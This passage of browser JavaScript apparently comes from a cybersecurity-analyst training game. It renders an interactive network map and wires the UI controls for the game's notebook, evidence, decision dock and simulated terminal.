    const rsClosed = n.redString && n.redString.closedBy && sideTrailResolved(n.redString.closedBy);
    const det = mapNodeDetermination(n);
    const locked = mapFlagLocked();
    const flaggable = !!det && !locked && mapDetReady(det);
    const picked = mapDetSelected(det);
    div.className = 'sim-map-node' + (status ? ' is-' + status : '')
      + (n.redString ? (rsClosed ? ' sim-map-node--redstring is-closed' : ' sim-map-node--redstring') : '')
      + (flaggable ? ' is-flaggable' : '')
      + (picked ? ' is-flagged' : '');
    div.style.left = n.x + '%';
    div.style.top = n.y + '%';
    const tag = status && MAP_STATUS_TAG[status]
      ? `<span class="sim-map-node-tag">${mapEsc(MAP_STATUS_TAG[status])}</span>` : '';
    const pick = det ? mapPickBadgeHtml(det, picked, flaggable) : '';
    const subKind = n.sub ? n.sub.toUpperCase() : '';
    div.innerHTML = `
      <span class="sim-map-node-dot" aria-hidden="true">${mapEsc(n.glyph || '•')}</span>
      <span class="sim-map-node-label">${mapEsc(n.label || '')}</span>
      <span class="sim-map-node-sub">${mapEsc(n.sub || '')}</span>
      ${tag}${pick}`;
    if (flaggable) {
      // Interactive determination: clicking records the EXISTING graded judgment
      // (setIdentification / setClassification) — no new scoring path.
      div.tabIndex = 0;
      div.setAttribute('role', 'button');
      div.setAttribute('aria-pressed', picked ? 'true' : 'false');
      div.setAttribute('aria-label', mapFlagAria(n, det, picked));
      const doFlag = e => { e.preventDefault(); e.stopPropagation(); simMapFlag(n, det, div); };
      div.addEventListener('click', doFlag);
      div.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') doFlag(e); });
      if (n.intel) {
        simMapIntelHoverBind(div, n.intel, n.label, subKind);   // hover/focus only — click is the flag
        simMapAddInfoBtn(div, n.intel, n.label, subKind);       // explicit intel for touch/click
      }
    } else if (n.intel) {
      div.tabIndex = 0;
      div.setAttribute('role', 'button');
      div.setAttribute('aria-label', `${n.label}${n.sub ? ', ' + n.sub : ''} — analyst intel`);
      simMapIntelBind(div, n.intel, n.label, subKind);
    }
    // Cross-case red string: a dedicated ⛓ affordance opens the recurring-entity
    // timeline, leaving the node's own intel-on-click behaviour intact.
    if (n.redString) {
      const chain = document.createElement('button');
      chain.type = 'button';
      chain.className = 'sim-map-redstring-btn' + (rsClosed ? ' is-closed' : '');
      chain.innerHTML = '<span aria-hidden="true">\u26d3</span> ACROSS CASES';
      chain.setAttribute('aria-label', `${n.label} appears across multiple cases — view the timeline`);
      const openTl = e => { e.preventDefault(); e.stopPropagation(); simMapTimelineShow(n.redString, chain); };
      chain.addEventListener('click', openTl);
      chain.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') openTl(e); });
      div.appendChild(chain);
    }
    host.appendChild(div);
  });

  const { shown, total } = mapVisibleNodeCount();
  if (hint) {
    hint.textContent = shown < total
      ? `${shown} of ${total} devices mapped — keep investigating in the terminal to reveal the rest.`
      : (map.hint || 'All devices mapped. Select any node or connection for analyst intel.');
  }
  const callEl = simMapEl.querySelector('#simMapCall');
  if (callEl) {
    const html = mapCallHtml();
    callEl.innerHTML = html;
    callEl.hidden = !html;
    callEl.classList.toggle('is-locked', mapFlagLocked());
  }
}

// Toggle + label the terminal-panel button to match map availability and progress.
function updateMapButton() {
  const btn = document.getElementById('simMapBtn');
  if (!btn) return;
  if (!missionHasMap()) { btn.hidden = true; return; }
  btn.hidden = false;
  const { shown, total } = mapVisibleNodeCount();
  btn.textContent = `◈ NETWORK MAP · ${shown}/${total}`;
}

function simInit() {
  // Shipping integration: re-hydrate from the authoritative progress.career now
  // that the host has loaded ech.progress.v1 (module-eval ran before that and only
  // had defaults). Harmless standalone (loadCareerState reads its own key).
  CAREER = loadCareerState();
  renderResourceBar();

  const back = document.getElementById('careerBackBtn');
  if (back) back.addEventListener('click', returnFromCareerMission);

  const resetBtn = document.getElementById('simResetBtn');
  if (resetBtn) {
    resetBtn.addEventListener('click', () => {
      resetCareerState();
      if (careerScreenOpen()) {
        returnFromCareerMission();
      }
    });
  }

  const form = document.getElementById('simTermForm');
  if (form) {
    form.addEventListener('submit', e => {
      e.preventDefault();
      // Hard lock: while Sarah has a pending call, the command line is paused —
      // steer the player to the Decision Dock instead of running a command.
      if (typeof decisionLocked === 'function' && decisionLocked()) { nudgeDecisionDock(); return; }
      const input = document.getElementById('simTermInput');
      const raw = input ? input.value : '';
      if (input) input.value = '';
      simHideTermLoadCue();
      if (typeof simRunCommand === 'function') simRunCommand(raw);
    });
  }

  // Teaching mode: clear the "press Enter" cue once the player empties the input.
  const termInput = document.getElementById('simTermInput');
  if (termInput) {
    termInput.addEventListener('input', () => {
      if (!termInput.value) simHideTermLoadCue();
    });
  }

  // Drag-to-resize side-column dividers (Task #151) — presentation-only. The
  // handles are static children of .career-main, so bind them once here.
  initSimResize();

  // One delegated handler for every interactive control inside #careerOps.
  // Panels are re-rendered, so we bind the stable parent and route by data-attr.
  const careerOps = document.getElementById('careerOps');
  if (careerOps) {
    careerOps.addEventListener('click', e => {
      // Collapsible side columns (Task #150) — presentation-only layout toggle.
      const colToggle = e.target.closest('[data-sim-col-toggle]');
      if (colToggle) { e.preventDefault(); toggleSimColumn(colToggle.dataset.simColToggle); return; }
      // On-demand File Reader close (Task #153) — presentation-only.
      if (e.target.closest('[data-file-reader-close]')) { e.preventDefault(); closeFileReader(); return; }
      // Reviewed-files reopen (Task #154) — reopen a read file into the File Reader
      // from the notebook. Reuses renderFileReader; surfaces no new evidence and
      // never touches the terminal history. Presentation-only.
      const fileReopen = e.target.closest('[data-reopen]');
      if (fileReopen) {
        e.preventDefault();
        const n = fileReopen.getAttribute('data-reopen');
        if (n && simFileByName(n)) {
          SIM.activeFile = n;
          renderFileReader();
          renderEvidencePanel();   // reflect the active-file highlight on the reopen chips
          const p = document.getElementById('simFileReader');
          if (p && typeof p.scrollIntoView === 'function') p.scrollIntoView({ block: 'nearest' });
        }
        return;
      }
      // Mission Brief compact/expand toggle (Task #153) — presentation-only.
      if (e.target.closest('[data-brief-toggle]')) { e.preventDefault(); SIM.briefExpanded = !SIM.briefExpanded; renderBriefPanel(); return; }
      // Decision Dock peek/expand (Task #153) — presentation-only chrome. Expanding a
      // blocking call also pulls focus to the first reply so the keyboard path is
      // intact; collapsing parks focus on the re-open button so it's never lost.
      if (e.target.closest('[data-dock-expand]')) {
        e.preventDefault();
        SIM.dockExpanded = true;
        renderDecisionDock(false);
        scrollTerminalToLatest();
        if (decisionLocked()) focusFirstDockReply();
        return;
      }
      if (e.target.closest('[data-dock-collapse]')) {
        e.preventDefault();
        SIM.dockExpanded = false;
        renderDecisionDock(false);
        const dk = document.getElementById('simDecisionDock');
        const go = dk && dk.querySelector('[data-dock-expand]');
        if (go && typeof go.focus === 'function') go.focus();
        return;
      }
      // Click-to-run command chips (B) — terminal listing + HUD. Route through the
      // existing simRunCommand chokepoint so the same decisionLocked()/onboardOpen
      // guards apply. Presentation-only; no new command path.
      const runCmd = e.target.closest('[data-run-cmd]');
      if (runCmd) {
        e.preventDefault();
        const c = runCmd.getAttribute('data-run-cmd');
        if (!c) return;
        // Teaching mode (Mission 1): load the command into the terminal so the
        // player sees it and runs it with Enter. Other missions keep click-to-run.
        if (commandTeachMode()) { simLoadCommandToTerminal(c); return; }
        if (typeof simRunCommand === 'function') simRunCommand(c);
        return;
      }
      // Analyst Notebook navigation chrome — presentation-only view-state.
      if (e.target.closest('[data-nb-focus]')) { setNotebookFocus(!SIM.focusNotebook); return; }
      if (e.target.closest('[data-nb-expand-all]')) { setAllNotebookCollapsed(false); return; }
      if (e.target.closest('[data-nb-collapse-all]')) { setAllNotebookCollapsed(true); return; }
      const nbToggle = e.target.closest('[data-nb-toggle]');
      if (nbToggle) { toggleNotebookSection(nbToggle); return; }
      // Network map (Task #94) — review-only overlay, opens on demand.
      const mapOpen = e.target.closest('[data-map-open]');
      if (mapOpen) { openSimMap(); return; }
      // Evidence presentation (Task #91) — all presentation-only, no scoring.
      const view = e.target.closest('[data-ev-view]');
      if (view) { setEvidenceView(view.dataset.evView); return; }
      const reveal = e.target.closest('[data-ev-reveal]');
      if (reveal) { toggleEvidenceLayer(reveal.dataset.evReveal, reveal.dataset.evLevel); return; }
      const term = e.target.closest('[data-term]');
      if (term) { toggleTerm(term); return; }
      const concern = e.target.closest('[data-concern]');
      if (concern) { toggleConcern(Number(concern.dataset.concern)); return; }
      const judg = e.target.closest('[data-judgment]');
      if (judg) { setJudgment(judg.dataset.judgment); return; }
      // "Review before the call" beat — acknowledge reading the file, then let the
      // real question surface. Presentation-only; flips a transient flag + re-syncs.
      const reviewAck = e.target.closest('[data-review-ack]');
      if (reviewAck) { acknowledgeReview(reviewAck.dataset.reviewAck); return; }
      const disc = e.target.closest('[data-discovery-judgment]');
      if (disc) { setDiscoveryJudgment(disc.dataset.challenge, disc.dataset.step, disc.dataset.option); return; }
      // Reconsideration pivot (revise/hold) — presentation-only, NON-graded.
      const recon = e.target.closest('[data-reconsideration]');
      if (recon) { setReconsideration(recon.dataset.rc, recon.dataset.option); return; }
      // Judgment-to-Power tools (Task #117) — transient, presentation-only spend.
      const pwr = e.target.closest('[data-power]');
      if (pwr) { useAnalystPower(pwr.dataset.power); return; }
      // Notebook Phase 3-5 — inline mark-up, derived findings, optional bet.
      const mTag = e.target.closest('[data-markup-tag]');
      if (mTag) { applyMarkupTag(mTag.dataset.markupTag); return; }
      const mId = e.target.closest('[data-markup-id]');
      if (mId) { reopenMarkup(mId.dataset.markupId); return; }
      const chip = e.target.closest('[data-finding-chip]');
      if (chip) { cycleFindingChip(chip.dataset.challenge, chip.dataset.findingChip); return; }
      const commit = e.target.closest('[data-finding-commit]');
      if (commit) { commitFinding(commit.dataset.findingCommit); return; }
      const reopen = e.target.closest('[data-finding-reopen]');
      if (reopen) { openChallengeInComms(reopen.dataset.findingReopen); return; }
      const bet = e.target.closest('[data-analyst-bet]');
      if (bet) { takeAnalystBet(bet.dataset.analystBet); return; }
      // #124 Sarah-sparring — calibration / two-voice / mentor trails (presentation-only).
      const calLvl = e.target.closest('[data-calib-level]');
      if (calLvl) { setCalibrationLevel(calLvl.dataset.calibLevel); return; }
      const calCommit = e.target.closest('[data-calib-commit]');
      if (calCommit) { commitCalibration(); return; }
      const twoVoice = e.target.closest('[data-twovoice]');
      if (twoVoice) { chooseTwoVoice(twoVoice.dataset.twovoice); return; }
      const trailRun = e.target.closest('[data-trail-run]');
      if (trailRun) { runMentorTrail(trailRun.dataset.trailRun); return; }
      // Optional side-trails (presentation-only) — expand/collapse + two-step judgment.
      const stOpen = e.target.closest('[data-sidetrail-open]');
      if (stOpen) { openSideTrail(stOpen.dataset.sidetrailOpen); return; }
      const stJ = e.target.closest('[data-sidetrail-judgment]');
      if (stJ) { setSideTrailJudgment(stJ.dataset.trail, stJ.dataset.step, stJ.dataset.option); return; }
      const ident = e.target.closest('[data-identify]');
      if (ident) { setIdentification(ident.dataset.identify); return; }

      const cls = e.target.closest('[data-classify-file]');
      if (cls) { setClassification(cls.dataset.classifyFile, cls.dataset.classifyVal); return; }
      const act = e.target.closest('[data-action]');
      if (act) { chooseAction(act.dataset.action); return; }
      const locked = e.target.closest('[data-locked]');
      if (locked) { chooseLockedAction(locked.dataset.locked); return; }
      const rec = e.target.closest('[data-rec]');
      if (rec) { submitRecommendation(rec.dataset.rec); return; }
      // #120 (D) micro-tradeoff ack — reversible toggle, hides nothing, never gates RETURN.
      const ack = e.target.closest('[data-consequence-ack]');
      if (ack) {
        const done = ack.getAttribute('aria-pressed') === 'true';
        ack.setAttribute('aria-pressed', done ? 'false' : 'true');
        ack.textContent = done ? 'Acknowledge sign-off' : 'Acknowledged ✓';
        return;
      }
      // #120 calm-state convenience chip — focus the always-present Evidence panel.
      const evf = e.target.closest('[data-ev-focus]');
      if (evf) {
        const ev = document.getElementById('simEvidence');
        if (ev) { ev.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); const f = ev.querySelector('button, [tabindex]'); if (f && f.focus) f.focus(); }
        return;
      }
      if (e.target.closest('[data-done]')) { returnFromCareerMission(); return; }
    });

    // #124 keep the calibration rationale in transient view-state on every
    // keystroke so an unrelated notebook re-render never wipes what was typed.
    careerOps.addEventListener('input', e => {
      const ta = e.target.closest('.sim-calib-input');
      if (!ta || !sarahOn('calibration')) return;
      const cal = ensureCalibrationState();
      if (cal.committed) return;
      cal.draftRationale = String(ta.value || '').slice(0, CALIB_MAX_RATIONALE);
    });

    // Keyboard parity for Phase 3-5 controls that are not native <button>s:
    // file lines (whole-line mark-up) and existing highlights (reopen in comms).
    careerOps.addEventListener('keydown', e => {
      if (e.key !== 'Enter' && e.key !== ' ' && e.key !== 'Spacebar') return;
      const nbToggle = e.target.closest('[data-nb-toggle]');
      if (nbToggle) { e.preventDefault(); toggleNotebookSection(nbToggle); return; }
      const fl = e.target.closest('[data-fileline]');
      if (fl) { e.preventDefault(); markupWholeLine(fl); return; }
      const mk = e.target.closest('[data-markup-id]');
      if (mk) { e.preventDefault(); reopenMarkup(mk.dataset.markupId); return; }
    });
  }

  // Phase 3 selection capture: surface the Fact/Anomaly/Unknown popover when the
  // player selects text inside the file view (mouse) or finishes a shift-select
  // (keyboard). Bound once to the stable terminal container.
  const term = document.getElementById('simTerminal');
  if (term) {
    term.addEventListener('mouseup', () => setTimeout(onTerminalSelection, 0));
    term.addEventListener('keyup', e => { if (e.shiftKey || e.key === 'Shift') setTimeout(onTerminalSelection, 0); });
  }
  // Dismiss the popover on any pointer-down outside it (but not on the controls
  // it carries — those route through the delegated click handler first).
  document.addEventListener('mousedown', e => {
    const pop = document.getElementById('simMarkupPopover');
    if (pop && !pop.hidden && !pop.contains(e.target)) hideMarkupPopover();
  });

  // Own Escape handler for the career Operating Center. oc.js's handler is
  // harmless when #careerOps is open (its screen checks all fall through).
  document.addEventListener('keydown', e => {
    if (e.key !== 'Escape') return;
    if (careerScreenOpen()) {
      // The network-map overlay takes Escape first, so it closes without
      // also exiting the mission underneath it.
      if (SIM.onboardOpen) { closeMissionOnboarding(); return; }
      if (SIM.briefOpen) { closeCommandBrief(); return; }
      if (SIM.conceptOpen) { closeConceptCard(); return; }
      if (SIM.mapOpen) { closeSimMap(); return; }
      // Notebook focus overlay exits next, before leaving the mission itself.
      if (SIM.focusNotebook) { setNotebookFocus(false); return; }
      returnFromCareerMission();
    }
  });

  // Deep-link straight into a career mission for demoing / testing — mirrors the
  // legacy ?holo= / ?console= / ?lab= deep-links (e.g. /?career=mission-001).
  try {
    const careerId = new URLSearchParams(window.location.search).get('career');
    if (careerId && CAREER_MISSIONS[careerId]) openCareerMission(careerId);
  } catch (_) { /* ignore malformed query strings */ }
}

/* ------------------------------------------------------------------ *
 * Boot contract (shipping integration)
 * Do NOT self-boot on DOMContentLoaded. The host app (script.js boot()) owns
 * boot ordering and calls window.echCareerInit() AFTER progress is loaded and
 * the Operations Center is rendered. Idempotent — a double call is harmless.
 * ------------------------------------------------------------------ */
let _echCareerInited = false;
function echCareerInit() {
  if (_echCareerInited) return;
  _echCareerInited = true;
  simInit();
}
window.echCareerInit = echCareerInit;
